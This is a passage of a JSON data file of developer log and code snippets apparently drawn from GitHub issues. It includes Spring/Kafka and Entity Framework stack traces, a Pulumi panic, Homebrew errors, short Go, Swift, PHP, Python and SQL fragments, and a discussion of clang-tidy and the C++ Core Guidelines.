~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.RecordMessagingMessageListenerAdapter.onMessage(RecordMessagingMessageListenerAdapter.java:51) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.doInvokeOnMessage(KafkaMessageListenerContainer.java:1880) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeOnMessage(KafkaMessageListenerContainer.java:1862) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.doInvokeRecordListener(KafkaMessageListenerContainer.java:1799) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.access$1900(KafkaMessageListenerContainer.java:432) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer$3.doInTransactionWithoutResult(KafkaMessageListenerContainer.java:1667) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.transaction.support.TransactionCallbackWithoutResult.doInTransaction(TransactionCallbackWithoutResult.java:36) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.support.TransactionTemplate.execute(TransactionTemplate.java:140) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeRecordListenerInTx(KafkaMessageListenerContainer.java:1658) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeRecordListener(KafkaMessageListenerContainer.java:1633) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeListener(KafkaMessageListenerContainer.java:1366) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.pollAndInvoke(KafkaMessageListenerContainer.java:1082) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.run(KafkaMessageListenerContainer.java:990) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515) ~[na:na]\r\n\tat java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264) ~[na:na]\r\n\tat java.base/java.lang.Thread.run(Thread.java:832) ~[na:na]\r\nCaused by: org.springframework.dao.InvalidDataAccessApiUsageException: Target object must not be null; nested exception is java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.orm.jpa.EntityManagerFactoryUtils.convertJpaAccessExceptionIfPossible(EntityManagerFactoryUtils.java:374) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.orm.jpa.vendor.HibernateJpaDialect.translateExceptionIfPossible(HibernateJpaDialect.java:257) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.translateExceptionIfPossible(AbstractEntityManagerFactoryBean.java:528) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.ChainedPersistenceExceptionTranslator.translateExceptionIfPossible(ChainedPersistenceExceptionTranslator.java:61) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.DataAccessUtils.translateIfNecessary(DataAccessUtils.java:242) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:153) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.CrudMethodMetadataPostProcessor$CrudMethodMetadataPopulatingMethodInterceptor.invoke(CrudMethodMetadataPostProcessor.java:178) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:212) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat com.sun.proxy.$Proxy81.save(Unknown Source) ~[na:na]\r\n\tat com.example.config.KafaTransactionDLTConfiguration.send(KafaTransactionDLTConfiguration.java:148) ~[classes/:na]\r\n\tat com.example.config.KafaTransactionDLTConfiguration.listen(KafaTransactionDLTConfiguration.java:112) ~[classes/:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:564) ~[na:na]\r\n\tat org.springframework.messaging.handler.invocation.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:171) ~[spring-messaging-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.messaging.handler.invocation.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:120) ~[spring-messaging-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.HandlerAdapter.invoke(HandlerAdapter.java:48) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.MessagingMessageListenerAdapter.invokeHandler(MessagingMessageListenerAdapter.java:329) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\t... 17 common frames omitted\r\nCaused by: java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.util.Assert.notNull(Assert.java:201) ~[spring-core-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.setWrappedInstance(AbstractNestablePropertyAccessor.java:195) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.BeanWrapperImpl.setWrappedInstance(BeanWrapperImpl.java:153) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.setWrappedInstance(AbstractNestablePropertyAccessor.java:183) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.<init>(AbstractNestablePropertyAccessor.java:122) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.BeanWrapperImpl.<init>(BeanWrapperImpl.java:103) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.util.DirectFieldAccessFallbackBeanWrapper.<init>(DirectFieldAccessFallbackBeanWrapper.java:36) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.JpaMetamodelEntityInformation.getId(JpaMetamodelEntityInformation.java:159) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.AbstractEntityInformation.isNew(AbstractEntityInformation.java:42) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.JpaMetamodelEntityInformation.isNew(JpaMetamodelEntityInformation.java:246) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.SimpleJpaRepository.save(SimpleJpaRepository.java:553) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:564) ~[na:na]\r\n\tat org.springframework.data.repository.core.support.ImplementationInvocationMetadata.invoke(ImplementationInvocationMetadata.java:72) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryComposition$RepositoryFragments.invoke(RepositoryComposition.java:382) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryComposition.invoke(RepositoryComposition.java:205) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryFactorySupport$ImplementationMethodExecutionInterceptor.invoke(RepositoryFactorySupport.java:549) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.repository.core.support.QueryExecutorMethodInterceptor.doInvoke(QueryExecutorMethodInterceptor.java:155) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.QueryExecutorMethodInterceptor.invoke(QueryExecutorMethodInterceptor.java:130) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor.invoke(DefaultMethodInvokingMethodInterceptor.java:80) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:367) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:118) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:139) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\t... 34 common frames omitted"
    },
    {
        "logs": "Exception message: Microsoft.EntityFrameworkCore.DbUpdateConcurrencyException: Database operation expected to affect 1 row(s) but actually affected 0 row(s). Data may have been modified or deleted since entities were loaded. See http://go.microsoft.com/fwlink/?LinkId=527962 for information on understanding and handling optimistic concurrency exceptions.\r\n\r\nStack trace:\r\nMicrosoft.EntityFrameworkCore.DbUpdateConcurrencyException: Database operation expected to affect 1 row(s) but actually affected 0 row(s). Data may have been modified or deleted since entities were loaded. See http://go.microsoft.com/fwlink/?LinkId=527962 for information on understanding and handling optimistic concurrency exceptions.\r\n   at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.ThrowAggregateUpdateConcurrencyException(Int32 commandIndex, Int32 expectedRowsAffected, Int32 rowsAffected)\r\n   at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.ConsumeResultSetWithPropagationAsync(Int32 commandIndex, RelationalDataReader reader, CancellationToken cancellationToken)\r\n   at Microsoft.EntityFrameworkCore.Update.AffectedCountModificationCommandBatch.ConsumeAsync(RelationalDataReader reader, CancellationToken cancellationToken)\r\n   at Microsoft.EntityFrameworkCore.Update.ReaderModificationCommandBatch.ExecuteAsync(IRelationalConnection connection, CancellationToken cancellationToken)\r\n   at Microsoft.EntityFrameworkCore.Update.ReaderModificationCommandBatch.ExecuteAsync(IRelationalConnection connection, CancellationToken cancellationToken)\r\n   at Microsoft.EntityFrameworkCore.Update.Internal.BatchExecutor.ExecuteAsync(IEnumerable"
    },
    {
        "logs": "/usr/lib/node_modules/slackin/node_modules/args/dist/index.js:39\r\nclass Args {\r\n^^^^^\r\nSyntaxError: Unexpected reserved word\r\n    at Module._compile (module.js:439:25)\r\n    at Object.Module._extensions..js (module.js:474:10)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:312:12)\r\n    at Module.require (module.js:364:17)\r\n    at require (module.js:380:17)\r\n    at Object.<anonymous> (/usr/lib/node_modules/slackin/bin/slackin:4:12)\r\n    at Module._compile (module.js:456:26)\r\n    at Object.Module._extensions..js (module.js:474:10)\r\n    at Module.load (module.js:356:32)"
    },
    {
        "logs": "/usr/lib/node_modules/slackin/node_modules/args/dist/index.js:39\r\nclass Args {\r\n^^^^^\r\nSyntaxError: Unexpected reserved word\r\n    at Module._compile (module.js:439:25)\r\n    at Object.Module._extensions..js (module.js:474:10)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:312:12)\r\n    at Module.require (module.js:364:17)\r\n    at require (module.js:380:17)\r\n    at Object.<anonymous> (/usr/lib/node_modules/slackin/bin/slackin:4:12)\r\n    at Module._compile (module.js:456:26)\r\n    at Object.Module._extensions..js (module.js:474:10)\r\n    at Module.load (module.js:356:32)"
    },
    {
        "logs": " \r\nsearchTextField\r\n    .rx.textInput.text\r\n            .debounce(0.5 , scheduler: MainScheduler.instance)\r\n            .distinct() // Missing argument for parameter #1 in call \r\n            .filter({ (string : String?) -> Bool in\r\n                return (string?.characters.count)! > 2\r\n            })\r\n           \r\n            \r\n            .observeOn(MainScheduler.asyncInstance)\r\n            \r\n            .subscribe(onNext: { (text : String?) in\r\n                print(text!)\r\n                self.getCities(forCountryISO2Code: \"LB\", withQuery: text!)\r\n            })\r\n            .addDisposableTo(disposeBag)"
    },
    {
        "logs": " \r\nsearchTextField\r\n    .rx.textInput.text\r\n            .debounce(0.5 , scheduler: MainScheduler.instance)\r\n            .distinct() // Missing argument for parameter #1 in call \r\n            .filter({ (string : String?) -> Bool in\r\n                return (string?.characters.count)! > 2\r\n            })\r\n           \r\n            \r\n            .observeOn(MainScheduler.asyncInstance)\r\n            \r\n            .subscribe(onNext: { (text : String?) in\r\n                print(text!)\r\n                self.getCities(forCountryISO2Code: \"LB\", withQuery: text!)\r\n            })\r\n            .addDisposableTo(disposeBag)"
    },
    {
        "logs": "$command = 'cd '.base_path().'; /usr/local/bin/php artisan backup:run';// > '.base_path().'/public/backuplog.txt 2>&1 &';\r\n        try{\r\n            passthru('whoami');\r\n            echo \"<br>\";\r\n            passthru($command);\r\n            echo \"<br>\";\r\n            echo $command.\"<br>\";\r\n            $command = 'cd '.base_path().'; php artisan backup:run';\r\n           echo  exec($command);\r\n           //$p = \\Artisan::call('backup:run');\r\n        }\r\n        catch(\\Exception $e){\r\n            return $e;\r\n        }"
    },
    {
        "logs": "brew install git && brew tap caskroom/cask && brew cask install docker docker-compose\r\n=> Error: Cask 'docker-compose' is unavailable: No Cask with this name exists."
    },
    {
        "logs": "brew install git && brew tap caskroom/cask && brew cask install docker docker-compose\r\n=> Error: Cask 'docker-compose' is unavailable: No Cask with this name exists."
    },
    {
        "logs": "type DB interface {\r\n        CreateTable(*dynamodb.CreateTableInput) (*dynamodb.CreateTableOutput, error)\r\n        DeleteItem(*dynamodb.DeleteItemInput) (*dynamodb.DeleteItemOutput, error)\r\n        GetItem(*dynamodb.GetItemInput) (*dynamodb.GetItemOutput, error)\r\n        PutItem(*dynamodb.PutItemInput) (*dynamodb.PutItemOutput, error)\r\n        UpdateItem(*dynamodb.UpdateItemInput) (*dynamodb.UpdateItemOutput, error)\r\n}"
    },
    {
        "logs": "type DB interface {\r\n        CreateTable(*dynamodb.CreateTableInput) (*dynamodb.CreateTableOutput, error)\r\n        DeleteItem(*dynamodb.DeleteItemInput) (*dynamodb.DeleteItemOutput, error)\r\n        GetItem(*dynamodb.GetItemInput) (*dynamodb.GetItemOutput, error)\r\n        PutItem(*dynamodb.PutItemInput) (*dynamodb.PutItemOutput, error)\r\n        UpdateItem(*dynamodb.UpdateItemInput) (*dynamodb.UpdateItemOutput, error)\r\n}"
    },
    {
        "logs": "In RequestException.php line 113:\r\n                                                                               \r\n  Client error: "
    },
    {
        "logs": ".  Modify Regolith session init script to call local build of i3 rather than the one shipped in the i3-gaps package\r\n2. Make a small change to config, remove keybinding stanza for gnome control center and put in a seperate file "
    },
    {
        "logs": " partial.\r\n3. Log into a fresh session\r\n\r\nObservations\r\n1. Keybinding to gnome control center continues to work, telling me that the partial has been loaded successfully\r\n2. Unexpectedly upon startup, rather than starting with workspace 1 I see workspace 11. (see screenshot)\r\n3. If I keep the "
    },
    {
        "logs": ").Scan(&dest); err != nil {                                                 \r\n        return nil, fmt.Errorf(\"failed: %w\", err)\r\n    }                               "
    },
    {
        "logs": "failed: sql: Scan error on column index 0, name \\\"jsonb\\\": unsupported Scan, storing driver.Value type []uint8 into type *map[string]interface {}"
    },
    {
        "logs": "type StringInterfaceMap map[string]interface{}                                                                              \r\n                                                                                                                            \r\nfunc (m *StringInterfaceMap) Scan(value interface{}) error {                                                                \r\n    b, ok := value.([]byte)                                                                                                 \r\n    if !ok {                                                                                                                \r\n        return errors.New(\"failed type assertion to []byte\")                                                                \r\n    }                                                                                                                       \r\n    return json.Unmarshal(b, &m)                                                                                            \r\n}"
    },
    {
        "logs": "Migrating from the OpenJDK legacy image to the newest image is a small config change.\r\n\r\ncircleci/openjdk:11.0.0 -> cimg/openjdk:11.0.0"
    },
    {
        "logs": "Migrating from the OpenJDK legacy image to the newest image is a small config change.\r\n\r\ncircleci/openjdk:11.0.0 -> cimg/openjdk:11.0.0"
    },
    {
        "logs": "================================================================================\r\nThe Pulumi CLI encountered a fatal error. This is a bug!\r\nWe would appreciate a report: https://github.com/pulumi/pulumi/issues/\r\nPlease provide all of the below text in your report.\r\n================================================================================\r\nPulumi Version:   v3.12.0\r\nGo Version:       go1.17\r\nGo Compiler:      gc\r\nArchitecture:     amd64\r\nOperating System: darwin\r\nPanic:            interface conversion: interface {} is nil, not string\r\n\r\ngoroutine 1 [running]:\r\nruntime/debug.Stack()\r\n\t/usr/local/Cellar/go/1.17/libexec/src/runtime/debug/stack.go:24 +0x65\r\nmain.panicHandler()\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/main.go:29 +0x3d\r\npanic({0x5443820, 0xc00023af90})\r\n\t/usr/local/Cellar/go/1.17/libexec/src/runtime/panic.go:1038 +0x215\r\nmain.getNodeProgramDependencies({0xc00017ed70, 0x37}, 0x0)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:705 +0x1be5\r\nmain.getProgramDependenciesAbout(0xc000915828, {0xc00017ed70, 0x2000}, 0x0)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:766 +0x8c\r\nmain.getSummaryAbout(0x12)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:148 +0x4e5\r\nmain.newAboutCmd.func1(0x0, {0x7020106, 0x0, 0xc000915d78})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:77 +0x45\r\ngithub.com/pulumi/pulumi/sdk/v3/go/common/util/cmdutil.RunFunc.func1(0xd, {0x682bb28, 0xc000915d90, 0x41eacf3})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/sdk/go/common/util/cmdutil/exit.go:96 +0x26\r\ngithub.com/pulumi/pulumi/sdk/v3/go/common/util/cmdutil.RunResultFunc.func1(0xc00096b8c0, {0x682bb28, 0x0, 0x0})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/sdk/go/common/util/cmdutil/exit.go:112 +0x4f\r\ngithub.com/spf13/cobra.(*Command).execute(0xc00096b8c0, {0x682bb28, 0x0, 0x0})\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:846 +0x5f8\r\ngithub.com/spf13/cobra.(*Command).ExecuteC(0xc0003eb340)\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:950 +0x3ad\r\ngithub.com/spf13/cobra.(*Command).Execute(...)\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:887\r\nmain.main()\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/main.go:48 +0x45"
    },
    {
        "logs": "================================================================================\r\nThe Pulumi CLI encountered a fatal error. This is a bug!\r\nWe would appreciate a report: https://github.com/pulumi/pulumi/issues/\r\nPlease provide all of the below text in your report.\r\n================================================================================\r\nPulumi Version:   v3.12.0\r\nGo Version:       go1.17\r\nGo Compiler:      gc\r\nArchitecture:     amd64\r\nOperating System: darwin\r\nPanic:            interface conversion: interface {} is nil, not string\r\n\r\ngoroutine 1 [running]:\r\nruntime/debug.Stack()\r\n\t/usr/local/Cellar/go/1.17/libexec/src/runtime/debug/stack.go:24 +0x65\r\nmain.panicHandler()\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/main.go:29 +0x3d\r\npanic({0x5443820, 0xc00023af90})\r\n\t/usr/local/Cellar/go/1.17/libexec/src/runtime/panic.go:1038 +0x215\r\nmain.getNodeProgramDependencies({0xc00017ed70, 0x37}, 0x0)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:705 +0x1be5\r\nmain.getProgramDependenciesAbout(0xc000915828, {0xc00017ed70, 0x2000}, 0x0)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:766 +0x8c\r\nmain.getSummaryAbout(0x12)\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:148 +0x4e5\r\nmain.newAboutCmd.func1(0x0, {0x7020106, 0x0, 0xc000915d78})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/about.go:77 +0x45\r\ngithub.com/pulumi/pulumi/sdk/v3/go/common/util/cmdutil.RunFunc.func1(0xd, {0x682bb28, 0xc000915d90, 0x41eacf3})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/sdk/go/common/util/cmdutil/exit.go:96 +0x26\r\ngithub.com/pulumi/pulumi/sdk/v3/go/common/util/cmdutil.RunResultFunc.func1(0xc00096b8c0, {0x682bb28, 0x0, 0x0})\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/sdk/go/common/util/cmdutil/exit.go:112 +0x4f\r\ngithub.com/spf13/cobra.(*Command).execute(0xc00096b8c0, {0x682bb28, 0x0, 0x0})\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:846 +0x5f8\r\ngithub.com/spf13/cobra.(*Command).ExecuteC(0xc0003eb340)\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:950 +0x3ad\r\ngithub.com/spf13/cobra.(*Command).Execute(...)\r\n\t/Users/brew/Library/Caches/Homebrew/go_mod_cache/pkg/mod/github.com/spf13/cobra@v1.0.0/command.go:887\r\nmain.main()\r\n\t/private/tmp/pulumi-20210909-33633-18beiyj/pkg/cmd/pulumi/main.go:48 +0x45"
    },
    {
        "logs": "shell\nPlease note that these warnings are just used to help the Homebrew maintainers\r\nwith debugging if you file an issue. If everything you use Homebrew for is\r\nworking fine: please don't worry or file an issue; just ignore this. Thanks!\r\n\r\nWarning: \"config\" scripts exist outside your system or Homebrew directories."
    },
    {
        "logs": " or graph data structure, fewer people implement one.\r\n\r\nNonetheless, the fact we can't allow for every context in a rule is why we hope that tools that check the Guidelines will provide flexible mechanisms for excluding code from analysis and suppressing individual warnings. I'm pretty sure clang-tidy does offer such mechanisms, although I'm no expert in them. If it doesn't, I'm sure the clang-tidy folks would be interested in a feature request ;-)\r\n\r\nAnd just to answer the observation about implementing a "
    },
    {
        "logs": " annotation is to coarse-grained (it disables all lints), and doesn't play good with a formatting tool (e.g. clang-format will move comments around to make them conform to a style guide, and if they end up in a different line, the annotation will refer to the wrong line and stop working). \r\n\r\nAll in all after using the guidelines for about one week, which is not much, I actually think that at least for me the major issues with the guidelines are:\r\n\r\n- 90% of the code we write are on libraries, that is, we build libraries to solve our problems, and then, use them to write applications. Application code is kept as small as possible, and reusable parts are always moved to a library sooner or later. @username_6 mentioned that the guidelines might not be suitable for library writers, and I think this hits us hard for working like this.\r\n\r\n- Most guidelines say \"Don't do that\", and that's it. This is a bit shocking to me, maybe because I am used to Rust's linting tool (clippy) which tells you \"You are doing this, but because of X it would probably be better to do this or that instead. However, in this or that case what you are doing is correct, and you can make it explicit by doing this, or you can disable this lint locally by doing that\". And Rust's is a language with some \"black and white\" cases where something is objectively better than another, which compares strongly to C++ where I do not think that there is a single black and white case, ever. When clang-tidy, which copies the text 1:1 from this repo, tells me \"Don't do that.\" in a piece of code where it is debatable (or actually the best thing to do), my first reaction is to think \"this lint is broken / this tool is broken\" and go for disabling the lint globally. It takes _extra effort_ to step back, consider what the lint is doing, why, go read the cpp guidelines, consider whether it does make sense (sometimes the black and white statements/examples are just simple, or \"forget\" that some corners of the language actually exist [0, 1]), and then consider whether I would like to be warned about this globally and should just try to disable this lint locally. This is partially a tool thing, but it also partially a cppguidelines thing. \r\n\r\n[0] One example would be "
    },
    {
        "logs": ", this ends up badly for unions. Is arguably a bug in clang-tidy, but IMO the root of the issue is that its _wording_ assumes that C++ is black and white, and that "
    },
    {
        "logs": ". This sort of naiveness significantly impact the user perception of these tools.\r\n\r\n[1]  Another one is the C-array to pointer decay check. I got lots of errors on variadic perfect forwarding functions from clang-tidy because \"sometimes\" they were correctly decaying char arrays to "
    },
    {
        "logs": "SELECT * \r\n    FROM validation_task_interaction \r\n    WHERE validation_task_interaction.action \r\n    NOT IN ('LowLevelEvent_mousemove',\r\n               'LowLevelEvent_mouseover',\r\n               'LowLevelEvent_mouseout',\r\n               'LowLevelEvent_mouseup',\r\n               'LowLevelEvent_mousedown',\r\n               'LowLevelEvent_keydown',\r\n               'LowLevelEvent_keyup',\r\n               'LowLevelEvent_click',\r\n               'POV_Changed')\r\n    ORDER BY TIMESTAMP DESC"
    },
    {
        "logs": "W0809 12:49:09.825091    6833 kubelet_node_status.go:502] Failed to set some node status fields: can't get ip address of node ubuntrancher. error: no default routes found in \"/proc/net/route\" or \"/proc/net/ipv6_ro"
    },
    {
        "logs": "    def _recv_confirm(self):\r\n        # read scp response\r\n        msg = b''\r\n        try:\r\n            msg = self.channel.recv(512)\r\n        except SocketTimeout:\r\n            raise SCPException('Timeout waiting for scp response')\r\n        # slice off the first byte, so this compare will work in py2 and py3\r\n        if msg and msg[0:1] == b'\\x00':\r\n            return\r\n        elif msg and msg[0:1] == b'\\x01':\r\n            raise SCPException(asunicode(msg[1:]))\r\n        elif self.channel.recv_stderr_ready():\r\n            msg = self.channel.recv_stderr(512)\r\n            raise SCPException(asunicode(msg))\r\n        elif not msg:\r\n            raise SCPException('No response from server')\r\n        else:\r\n            raise SCPException('Invalid response from server', msg)"
    },
    {
        "logs": "    sub = rospy.Subscriber('/camera/infra1/image_rect_raw', msg_Image, image_callback, queue_size=1)\r\n\r\n    def image_callback(self, image_msg):\r\n        system_time = time.time()\r\n        try:\r\n            image = self.bridge.imgmsg_to_cv2(image_msg, desired_encoding=\"passthrough\")\r\n        except CvBridgeError as e:\r\n            print(e)\r\n        print image.shape"
    },
    {
